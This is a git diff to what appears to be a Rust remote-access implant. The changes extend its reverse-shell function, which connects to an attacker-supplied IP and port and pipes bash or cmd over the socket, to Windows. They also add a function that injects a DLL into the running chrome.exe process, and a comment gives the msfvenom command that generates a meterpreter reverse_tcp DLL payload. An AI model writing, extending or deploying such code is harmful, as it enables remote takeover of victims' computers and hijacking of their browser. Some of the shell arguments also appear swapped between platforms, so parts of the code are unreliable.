@@ -12,6 +12,7 @@ use std::io::Result;
 use std::net::{TcpStream as reverse_stream};
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
+use dll_syringe::{Syringe, process::OwnedProcess};
 
 #[derive(Serialize, Deserialize)]
 struct Message {
@@ -57,17 +58,23 @@ pub fn interpret_payload(payload: String) {
     let infos_payload = payload.split_whitespace().collect::<Vec<_>>();
     if infos_payload[0] == "reverseshell"{
         println!("Activating reverseshell");
-        shell("bash".to_string(), infos_payload[1], infos_payload[2]);
+        if cfg!(target_os = "windows") {
+            shell("cmd".to_string(), infos_payload[1], infos_payload[2], "-i");
+        }
+        else {
+            shell("bash".to_string(), infos_payload[1], infos_payload[2], "/C");
+        }
+        
     }
 }
 
-pub fn shell(shell: String, ip: &str, port: &str) -> Result<()> {
+pub fn shell(shell: String, ip: &str, port: &str, arg: &str) -> Result<()> {
     let sock = reverse_stream::connect(format!("{}:{}", ip, port))?;
     let fd = sock.as_raw_fd();
 
     // Open shell
     Command::new(format!("{}", shell))
-        .arg("-i")
+        .arg(format!("{}", arg))
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
         .stderr(unsafe { Stdio::from_raw_fd(fd) })
@@ -160,5 +167,18 @@ async fn main() -> io::Result<()> {
         }
     }
 
-    //Shell
+//dll injection
+}
+pub fn dll_injector() {
+    //on cherche le process à injecter 
+    let targer_process = OwnedProcess::find_first_by_name("chrome.exe").unwrap();
+    //on crée un "syringe" pour le process cible
+    let syringe = Syringe::for_process(targer_process);
+    //on injecte le payload dans le process cible
+    let injected_payload = syringe.inject("injection_payload.dll").unwrap();
+    //a test
+
+    //Dll generate
+    //sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --plateform windows -f dll LHOST=ip LPORT=4444 > payload.shellcode
+
 }
